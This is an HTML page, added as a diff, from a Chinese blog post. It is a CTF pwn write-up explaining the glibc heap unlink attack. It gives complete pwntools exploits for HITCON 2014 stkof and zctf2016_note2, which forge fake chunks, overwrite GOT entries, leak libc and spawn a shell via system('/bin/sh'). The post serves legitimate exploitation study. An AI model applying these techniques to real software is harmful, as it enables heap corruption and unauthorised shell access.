@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <meta name="description" content="1.前言以及一点点感慨最近学完了unlink，做一下记录吧，还是挺感慨的，最近堆题有时候真是一题调晚上，甚至是一天，但是慢慢找到堆题的技巧了，感觉自己至少知道该如何调试一个程序了，自己最大的进步就是以前看着wp无法getshell的时候会不知道怎么办，现在知道该如何一点点去调试，看看底层哪里出了问题，然后找到问题的所在，所以慢慢的自己可以学会一个一个手法，有一种自己真正入门了的感觉。虽然学的很慢，但是相信总有一天我会把所有东西学会的。" />
+  
+
+  
+  
+  
+  
+  
+  
+  <title>unlink | refrain的blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="1.前言以及一点点感慨最近学完了unlink，做一下记录吧，还是挺感慨的，最近堆题有时候真是一题调晚上，甚至是一天，但是慢慢找到堆题的技巧了，感觉自己至少知道该如何调试一个程序了，自己最大的进步就是以前看着wp无法getshell的时候会不知道怎么办，现在知道该如何一点点去调试，看看底层哪里出了问题，然后找到问题的所在，所以慢慢的自己可以学会一个一个手法，有一种自己真正入门了的感觉。虽然学的很慢，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="unlink">
+<meta property="og:url" content="http://example.com/2021/10/15/unlink/index.html">
+<meta property="og:site_name" content="refrain的blog">
+<meta property="og:description" content="1.前言以及一点点感慨最近学完了unlink，做一下记录吧，还是挺感慨的，最近堆题有时候真是一题调晚上，甚至是一天，但是慢慢找到堆题的技巧了，感觉自己至少知道该如何调试一个程序了，自己最大的进步就是以前看着wp无法getshell的时候会不知道怎么办，现在知道该如何一点点去调试，看看底层哪里出了问题，然后找到问题的所在，所以慢慢的自己可以学会一个一个手法，有一种自己真正入门了的感觉。虽然学的很慢，">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2021/10/15/unlink/1.jpg">
+<meta property="og:image" content="http://example.com/2021/10/15/unlink/2.png">
+<meta property="og:image" content="http://example.com/2021/10/15/unlink/3.png">
+<meta property="og:image" content="http://example.com/2021/10/15/unlink/5.jpg">
+<meta property="og:image" content="http://example.com/2021/10/15/unlink/6.png">
+<meta property="og:image" content="http://example.com/2021/10/15/unlink/7.png">
+<meta property="og:image" content="http://example.com/2021/10/15/unlink/8.png">
+<meta property="og:image" content="http://example.com/2021/10/15/unlink/9.png">
+<meta property="og:image" content="http://example.com/2021/10/15/unlink/10.png">
+<meta property="article:published_time" content="2021-10-14T16:15:59.000Z">
+<meta property="article:modified_time" content="2021-10-15T10:31:52.635Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/10/15/unlink/1.jpg">
+  
+  
+    <link rel="icon" href="/css/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+
+  
+  <!-- baidu webmaster push -->
+  <script src='//push.zhanzhang.baidu.com/push.js'></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body class="home blog custom-background custom-font-enabled single-author">
+  <div id="page" class="hfeed site">
+      <header id="masthead" class="site-header" role="banner">
+    <hgroup>
+      <h1 class="site-title">
+        <a href="/" title="refrain的blog" rel="home">refrain的blog</a>
+      </h1>
+      
+        <h2 class="site-description hitokoto"></h2>
+        <script type="text/javascript" src="https://v1.hitokoto.cn/?encode=js"></script>
+      
+    </hgroup>
+
+    <nav id="site-navigation" class="main-navigation" role="navigation">
+            <button class="menu-toggle">菜单</button>
+            <a class="assistive-text" href="/#content" title="跳至内容">跳至内容</a><!--TODO-->
+            <div class="menu-main-container">
+                <ul id="menu-main" class="nav-menu">
+                
+                    <li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="/">Home</a></li>
+                
+                    <li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="/archives">Archives</a></li>
+                
+                </ul>
+            </div>
+    </nav>
+</header>
+
+      <div id="main" class="wrapper">
+        <div id="primary" class="site-content"><div id="content" role="main"><article id="post-unlink" class="post-unlink post type-post status-publish format-standard hentry">
+    <!---->
+
+      <header class="entry-header">
+        
+        
+  
+    <h1 class="entry-title article-title">
+      unlink
+    </h1>
+  
+
+        
+        <div class="comments-link">
+            
+            <a href="javascript:void(0);" data-url="http://example.com/2021/10/15/unlink/" data-id="ckus8fgvx0003ssvkab720i9x" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+        </div><!-- .comments-link -->
+      </header><!-- .entry-header -->
+
+    <div class="entry-content">
+      
+        <h1 id="1-前言以及一点点感慨"><a href="#1-前言以及一点点感慨" class="headerlink" title="1.前言以及一点点感慨"></a>1.前言以及一点点感慨</h1><p>最近学完了unlink，做一下记录吧，还是挺感慨的，最近堆题有时候真是一题调晚上，甚至是一天，但是慢慢找到堆题的技巧了，感觉自己至少知道该如何调试一个程序了，自己最大的进步就是以前看着wp无法getshell的时候会不知道怎么办，现在知道该如何一点点去调试，看看底层哪里出了问题，然后找到问题的所在，所以慢慢的自己可以学会一个一个手法，有一种自己真正入门了的感觉。虽然学的很慢，但是相信总有一天我会把所有东西学会的。</p>
+<span id="more"></span>
+
+<h1 id="2-unlink"><a href="#2-unlink" class="headerlink" title="2.unlink"></a>2.unlink</h1><p>讲unlink之前还是想再感慨一下，其实这个时候反思一下，才觉得自己原来的学习方法不是太好，刚开始看ctfwiki那些攻击手法真的一点也看不下去，现在想想，每一个攻击手法都是有目的，我们应该先弄清楚，我们通过这个手法获得了什么能力，通过例题最好，去看现象也行，然后再去仔细看那些其他的东西，而不是上来被一大堆指针绕来绕去，最后也不知道文章说了什么。</p>
+<p>所以，我们觉得我们首先应该来看看我们通过unlink获得了什么能力，按照我目前的理解，其实就是我们修改了一个指向chunk的指针ptr,变成了ptr-0x18，大家可能会觉得他没什么卵用，但其实还是有用的，通过他我们可以完成覆写got表等操作。</p>
+<p>但是现在想要触发unlink，需要通过检测，我还是想先写一下例题，也可以让我自己更好的理解unlink，希望大家跟着一起调一调</p>
+<h1 id="3-2014-HITCON-stkof"><a href="#3-2014-HITCON-stkof" class="headerlink" title="3.2014 HITCON stkof"></a>3.2014 HITCON stkof</h1><p>菜单题，main和menu都没什么好说的，直接看功能吧</p>
+<h2 id="1-alloc"><a href="#1-alloc" class="headerlink" title="1.alloc"></a>1.alloc</h2><p><img src="/2021/10/15/unlink/1.jpg" alt="1"></p>
+<p>没啥好说的，很干净，值得注意的是，这里把chunk的地址存储在了globals这个全局变量里，我们后面的unlink也是对这里进行攻击。</p>
+<h2 id="2-free-chunk"><a href="#2-free-chunk" class="headerlink" title="2.free_chunk"></a>2.free_chunk</h2><p><img src="/2021/10/15/unlink/2.png" alt="2"></p>
+<p>也是很干净的函数，free以后把指针清0，没有uaf</p>
+<h2 id="3-fill"><a href="#3-fill" class="headerlink" title="3.fill"></a>3.fill</h2><p><img src="/2021/10/15/unlink/3.png" alt="3"></p>
+<p>本题最大的漏洞所在，因为向chunk写入内容的时候，重新指定了内容的size，并且没有任何限制，于是造成了堆溢出的漏洞</p>
+<h2 id="4-程序调试"><a href="#4-程序调试" class="headerlink" title="4.程序调试"></a>4.程序调试</h2><p>下面我们来跟着wp一步步调试程序，看看unlink的过程中到底发生了什么</p>
+<p>我们先把前面的函数功能写好</p>
+<p>这里head就是存储chunk地址的全局变量的数组所在的地址</p>
+<p>from pwn import *<br>p = process(“./stkof”)<br>#p = remote(“node4.buuoj.cn”,27758)<br>elf = ELF(“./stkof”)<br>libc = ELF(‘/lib/x86_64-linux-gnu/libc-2.23.so’)<br>#libc = ELF(‘./libc-2.23-buu.so’)<br>head = 0x602140<br>def alloc(size):<br>    p.sendline(‘1’)<br>    p.sendline(str(size))<br>    p.recvuntil(b”OK\n”)</p>
+<p>def edit(idx, size, content):<br>    p.sendline(‘2’)<br>    p.sendline(str(idx))<br>    p.sendline(str(size))<br>    p.send(content)<br>    p.recvuntil(b”OK\n”)</p>
+<p>def free(idx):<br>    p.sendline(‘3’)<br>    p.sendline(str(idx))</p>
+<p>注意这里有一个缓冲区的问题，详细可以看ctfwiki，因为比赛将近忙着更有效率的提升，自己暂时也没花时间去看，然后我们申请3个chunk</p>
+<p>alloc(0x100) //chunk1 申请一个较大的chunk解决缓冲区的问题<br>alloc(0x30)//chunk2 用来构造fakechunk<br>alloc(0x80)//chunk3 用一个unsortedbin free的时候触发unlink，前向合并伪造的fakechunk以达到目的</p>
+<p>gdb.attach(p)//调试程序</p>
+<p><img src="/2021/10/15/unlink/5.jpg" alt="5"></p>
+<p>在gdb中可以看到heap的空间如下，有一些奇怪的东西就是缓冲区造成的结构，在这里我们只要关注0x1d81530以及570的chunk2和3就行</p>
+<p>payload = p64(0)// prev_size<br>payload += p64(0x20)//size<br>payload += p64(head + 16 -0x18)//fakefd,其实这里是&amp;fakechunk-0x18<br>payload += p64(head + 16 -0x10)//fakebk,其实这里是&amp;fakechunk-0x10<br>payload += p64(0x20)//nextchunk_prev_size,为了绕过检测<br>payload = payload.ljust(0x30, b’a’)填充一些垃圾数据<br>payload += p64(0x30)这里其实是chunk3的prev_size位，改为0x30也就是chunk2的size是为了unlink时正确的触发前向合并<br>payload += p64(0x90)//把chunk3的prev_inuse位改为了0，也就是从0x91变成了0x90，这样上一个chunk也就是chunk2就会被认为是未被使用，可以成功触发unlink前向合并<br>edit(2,len(payload),payload)//用edit的溢出功能完成payload的写入<br>free(3)//触发unlink<br>p.recvuntil(b”OK\n”)</p>
+<p>这里我们通过向chunk2写入payload伪造了一个fakechunk，并且溢出覆盖了一些重要的比特位，然后free(3)完成unlink。</p>
+<p>但我们的目的是为了通过这道题学习unlink的使用，所以我们先不执行最后的free(3),来到触发unlink前的状态，我们先调试一下看看head这个全局变量的位置存储的是什么，然后再触发unlink看看发生了什么</p>
+<p><img src="/2021/10/15/unlink/6.png" alt="6"></p>
+<p>正如程序所写的那样，存放了3个chunk的地址，然后我们再来看一下我们的payload输进去以后，chunk2和chunk3的位置发生了什么。</p>
+<p><img src="/2021/10/15/unlink/7.png" alt="7"></p>
+<p>其实也没发生什么，就是payload被写在了他该在的位置，这里就是给如果有刚学不太懂的新人演示一下。</p>
+<p>接着，我们来free(3)触发unlink，看看发生了什么神奇的事情。</p>
+<p>我们先来看看head位置发生了什么，这也是unlink的直接效果</p>
+<p><img src="/2021/10/15/unlink/8.png" alt="8"></p>
+<p>我们可以看到，chunk3因为被free所以已经没有了，然后神奇的地方发生了，在0x602150的位置，对比上一张图，存储的是chunk2的地址，现在变成了head - 0x8，也就是head+16-0x18也就是我们构造的fakechunk_fd,这也就是unlink的最终效果，我们把ptr里的内容变成了*（&amp;ptr-0x18）这个指针</p>
+<p>然后我们再来看一下chunk2和chunk3里发生了什么</p>
+<p><img src="/2021/10/15/unlink/9.png" alt="9"></p>
+<p>我们可以看到fakechunk与chunk3发生合并，并且一起被放入了topchunk所以fakechunk_size变成了0x20ac1=0x30+0x90+0x20a01</p>
+<p>而原先的chunk2的指针，已经变成了&amp;ptr-0x18，所以改变指针有什么用呢，比如我们如果再次用过edit（2,payload）的方式写入数据，原本将写入chunk2的位置，现在我们就会写入0x602138的位置，这看起来没什么，但如果我们写入一个指针，就会发生很有意思的事情，让我们继续看</p>
+<p>payload = b’a’*8 + p64(elf.got[‘free’]) + p64(elf.got[‘puts’]) + p64(elf.got[‘atoi’])<br>edit(2,len(payload),payload)</p>
+<p><img src="/2021/10/15/unlink/10.png" alt="10"></p>
+<p>我们可以看到，我们把chunk0的位置写入了free的got表,chunk1的位置写入了puts的got表,chunk2的位置写入了atoi的got表<br>下面我们，最有意思的地方来了，要注意，我们使用edit功能，写入哪里都是通过head这个全局变量存储的地址决定的，所以，当我们再一次使用edit(0,payload)的时候，我们写入的地方就变成了free的got表，我们像free的got表里写入了地址，就像变魔法一样，我们改变了free的got表，也就改变了free这个函数真正的功能。</p>
+<p>payload = p64(elf.plt[‘puts’])<br>edit(0,len(payload),payload)<br>free(1)</p>
+<p>所以我们将puts的plt地址写入了free的got表，于是当我们free(1)的时候，要知道chunk1也被我们变成了puts的got表地址，于是，我们便将puts的got表地址打印出来了，下面就是简单的泄露libc基址。</p>
+<p>然后和修改freegot表一样的操作，用edit(2,payload)来修改atoi的got表为system的地址，然后直接向程序发送”/bin/sh”写入system(“/bin/sh”)就可以getshell，我也就不细说了，大家自己多动手调试调试，我的经验就是pwn一定要自己动手，会有很奇妙的体验和发现</p>
+<p>puts_addr = u64(p.recvuntil(b’\nOK\n’,drop=True).ljust(8, b’\x00’))<br>libc_base = puts_addr -libc.symbols[‘puts’]<br>binsh_addr = libc_base + libc.search(b’/bin/sh’).<strong>next</strong>()<br>system_addr = libc_base + libc.symbols[‘system’]<br>payload = p64(system_addr)<br>edit(2,len(payload),payload)<br>p.send(p64(binsh_addr))<br>#gdb.attach(p)<br>p.interactive()</p>
+<p>这里是后面的代码</p>
+<p>再放一下完整的wp</p>
+<h2 id="3-完整wp"><a href="#3-完整wp" class="headerlink" title="3.完整wp"></a>3.完整wp</h2><p>from pwn import *<br>p = process(“./stkof”)<br>#p = remote(“node4.buuoj.cn”,27758)<br>elf = ELF(“./stkof”)<br>libc = ELF(‘/lib/x86_64-linux-gnu/libc-2.23.so’)<br>#libc = ELF(‘./libc-2.23-buu.so’)<br>head = 0x602140<br>def alloc(size):<br>    p.sendline(‘1’)<br>    p.sendline(str(size))<br>    p.recvuntil(b”OK\n”)</p>
+<p>def edit(idx, size, content):<br>    p.sendline(‘2’)<br>    p.sendline(str(idx))<br>    p.sendline(str(size))<br>    p.send(content)<br>    p.recvuntil(b”OK\n”)</p>
+<p>def free(idx):<br>    p.sendline(‘3’)<br>    p.sendline(str(idx))<br>alloc(0x100)<br>alloc(0x30)<br>alloc(0x80)<br>payload = p64(0)<br>payload += p64(0x20)<br>payload += p64(head + 16 -0x18)<br>payload += p64(head + 16 -0x10)<br>payload += p64(0x20)<br>payload = payload.ljust(0x30, b’a’)<br>payload += p64(0x30)</p>
+<p>payload += p64(0x90)<br>edit(2,len(payload),payload)<br>free(3)<br>p.recvuntil(b”OK\n”)<br>payload = b’a’*8 + p64(elf.got[‘free’]) + p64(elf.got[‘puts’]) + p64(elf.got[‘atoi’])<br>edit(2,len(payload),payload)<br>payload = p64(elf.plt[‘puts’])<br>edit(0,len(payload),payload)<br>free(1)<br>puts_addr = u64(p.recvuntil(b’\nOK\n’,drop=True).ljust(8, b’\x00’))<br>libc_base = puts_addr -libc.symbols[‘puts’]<br>binsh_addr = libc_base + libc.search(b’/bin/sh’).<strong>next</strong>()<br>system_addr = libc_base + libc.symbols[‘system’]<br>payload = p64(system_addr)<br>edit(2,len(payload),payload)<br>p.send(p64(binsh_addr))<br>#gdb.attach(p)<br>p.interactive()</p>
+<h1 id="3-unlink的绕过"><a href="#3-unlink的绕过" class="headerlink" title="3.unlink的绕过"></a>3.unlink的绕过</h1><p>unlink的检测主要是这句话</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// fd bk</span><br><span class="line">if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))                      \</span><br><span class="line">  malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);  \</span><br></pre></td></tr></table></figure>
+
+<p>也就是说，我们的FD-&gt;bk需要=p的地址，同理BK-&gt;fd需要等于p</p>
+<p>也就是说p的前一个chunk的下一个chunk是p，p的下一个chunk的前一个chunk是p</p>
+<p>这里也是最绕人，入门学习起来最困难的地方。</p>
+<p>所以我们用上一道例题，来回想一下我们做了什么</p>
+<p>最主要的就是这里</p>
+<p>payload = p64(0)// prev_size<br>payload += p64(0x20)//size<br>payload += p64(head + 16 -0x18)//fakefd,其实这里是&amp;fakechunk-0x18<br>payload += p64(head + 16 -0x10)//fakebk,其实这里是&amp;fakechunk-0x10</p>
+<p>这里，我们在chunk2的content位置构造了一个fakechunk，fakechunk的下一个chunk，也就是chunk3，当我们free(3)的时候，会触发unlink，这个时候会进行检测，fakechunk的上一个chunk，我们叫他FD，同理，下一个chunk我们叫他BK，会检测FD-&gt;bk是否等于fakechunk的地址，也就是&amp;fakechunk,BK-&gt;fd是否等于fakechunk的地址，也就是&amp;fakechunk,然后这时候有意思的事情就发生了，由于我们通过溢出或者某些手法，将fakechunk的fd改成了&amp;fakechunk-0x18,fd指针相信大家都知道是什么，那么系统就会认为fakechunk的上一个chunk的地址，也就是FD，他并不是真正的FD，所以实际上，我们是创造了一个fakeFD在&amp;fakechunk-0x18的位置，他并没有实际的chunk的数据结构，仅仅是为了绕过而形成的，一个逻辑上的chunk，不知道这样说大家能不能明白，下面，我都会将这个假的FD称为fakeFD，一个chunk的bk指针，通过chunk的结构体我们可以知道，应该在&amp;chunk-0x18的位置，于是我们创造出的fakeFD的bk指针应该在&amp;fakeFD-0x18的位置，而&amp;fakeFD又等于&amp;fakechunk+0x18，所以fakeFD-&gt;bk=&amp;fakeFD-0x18=&amp;fakechunk+0x18-0x18=&amp;fakechunk</p>
+<p>这时你会发现我们竟然绕过了检测，同理下一个检测BK-&gt;fd=p也是一样的道理，如果你看懂了上面这里应该也很好理解，我就不细说了。</p>
+<p>需要注意的是，网上很多文章都是伪代码，比如fakechunk到底是fakechunk的地址还是内容也没有写清楚，总之我就是用取地址符&amp;来指代fakechunk的地址，大家能看懂就好</p>
+<p>如果上面还是觉得抽象，难以理解，不妨代入一下，最上面代码中的p其实就是我们伪造的fakechunk，然后根据我说的自己再绕一绕，应该很快就理解了，最重要的就是要理解我们构造p也就是fakechunk的fd和bk其实是为了创造出两个“逻辑上”的新堆块fakeFD和fakeBK，他们没有具体的chunk的数据结构，仅仅是为了绕过检测而存在。</p>
+<p>明天比赛将近，我应该晚上会去加紧学习tache attack和off by one，希望比赛时候能做出来点题目吧，感觉要学的东西实在是太多了…</p>
+<p>比完赛会把另外一道例题zctf2016_note2的wp给写了，暂时就放个exp吧</p>
+<h1 id="4-zctf2016-note2"><a href="#4-zctf2016-note2" class="headerlink" title="4.zctf2016_note2"></a>4.zctf2016_note2</h1><p>from pwn import *<br>p = remote(“node4.buuoj.cn”,26635)<br>#p = process(“./note2”)<br>#libc = ELF(“/lib/x86_64-linux-gnu/libc-2.23.so”)<br>libc = ELF(“./libc-2.23-buu.so”)<br>elf = ELF(“./note2”)<br>def add(size,content):<br>    p.recvuntil(b”option—&gt;&gt;”)<br>    p.sendline(‘1’)<br>    p.recvuntil(b”Input the length of the note content:(less than 128)”)<br>    p.sendline(str(size))<br>    p.recvuntil(b”Input the note content:”)<br>    p.sendline(content)<br>def delete(index):<br>    p.recvuntil(b”option—&gt;&gt;”)<br>    p.sendline(‘4’)<br>    p.recvuntil(b”Input the id of the note:”)<br>    p.sendline(str(index))<br>    p.recvuntil(b”delete note success!”)<br>def shownote(index):<br>    p.recvuntil(b’option—&gt;&gt;’)<br>    p.sendline(‘2’)<br>    p.recvuntil(b’note:’)<br>    p.sendline(str(index))<br>def editnote(index, choice, s):<br>    p.recvuntil(b’option—&gt;&gt;’)<br>    p.sendline(‘3’)<br>    p.recvuntil(b’note:’)<br>    p.sendline(str(index))<br>    p.recvuntil(b’2.append]’)<br>    p.sendline(str(choice))<br>    p.sendline(s)<br>p.recvuntil(‘Input your name:’)<br>p.sendline(‘aaaa’)<br>p.recvuntil(‘Input your address:’)<br>p.sendline(‘1111’)<br>ptr = 0x602120<br>fake_fd = ptr - 0x18<br>fake_bk = ptr -0x10<br>content = b’a’*8 + p64(0x61) + p64(fake_fd) + p64(fake_bk) + b’b’*64+p64(0x60)<br>add(128,content)<br>add(0,b’a’*8)<br>add(0x80,b’c’*16)<br>delete(1)<br>content = b’a’*16 + p64(0xa0) + p64(0x90)<br>add(0,content)<br>delete(2)<br>atoi_got = elf.got[‘atoi’]<br>content = b’a’*0x18 + p64(atoi_got)<br>editnote(0,1,content)<br>shownote(0)<br>p.recvuntil(“is “)<br>atoi_addr = u64(p.recv(6).ljust(8, b’\x00’))<br>libc_base = atoi_addr - libc.symbols[‘atoi’]<br>system_addr = libc_base + libc.symbols[‘system’]<br>content = p64(system_addr)<br>editnote(0,1,content)<br>p.recvuntil(“option—&gt;&gt;”)<br>p.sendline(“/bin/sh”)<br>#gdb.attach(p)<br>p.interactive()</p>
+
+      
+    </div><!-- .entry-content -->
+
+    <footer class="entry-meta">
+    <a href="/2021/10/15/unlink/">
+    <time datetime="2021-10-14T16:15:59.000Z" class="entry-date">
+        2021-10-15
+    </time>
+</a>
+    
+    
+    </footer>
+</article>
+
+
+    
+<nav class="nav-single">
+    <h3 class="assistive-text">文章导航</h3>
+    
+    
+        <span class="nav-next"><a href="/2021/10/09/unsortedbin-attack/" rel="next">unsortedbin attack <span class="meta-nav">→</span></a></span>
+    
+</nav><!-- .nav-single -->
+
+
+
+
+
+
+
+</div></div>
+        <div id="secondary" class="widget-area" role="complementary">
+  
+    <aside id="search" class="widget widget_search"><form role="search" method="get" accept-charset="utf-8" id="searchform" class="searchform" action="//google.com/search">
+    <div>
+        <input type="text" value="" name="s" id="s" />
+        <input type="submit" id="searchsubmit" value="搜索" />
+    </div>
+</form></aside>
+  
+    
+  
+    
+  
+    
+  <aside class="widget">
+    <h3 class="widget-title">Recents</h3>
+    <div class="widget-content">
+      <ul>
+        
+          <li>
+            <a href="/2021/10/15/unlink/">unlink</a>
+          </li>
+        
+          <li>
+            <a href="/2021/10/09/unsortedbin-attack/">unsortedbin attack</a>
+          </li>
+        
+          <li>
+            <a href="/2021/10/03/fastbin-attack/">fastbin attack</a>
+          </li>
+        
+          <li>
+            <a href="/2021/09/21/babyheap-0ctf-2017-wp/">babyheap_0ctf_2017-wp</a>
+          </li>
+        
+          <li>
+            <a href="/2021/07/12/pwn-buuctf-rip-%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA-%E8%AF%A6%E7%BB%86wp/">pwn buuctf rip 简单栈溢出 详细wp</a>
+          </li>
+        
+      </ul>
+    </div>
+  </aside>
+
+  
+    
+  
+    
+  
+</div>
+      </div>
+      <footer id="colophon" role="contentinfo">
+    <p>&copy; 2021 John Doe
+    All rights reserved.</p>
+    <p>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></p>
+</footer>
+    <script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"1","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/js/share.js'];</script>
+
+<script src="/js/jquery-3.3.1.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/navigation.js"></script>
+
+<div id="bg"></div>
+
+  </div>
+</body>
+</html>
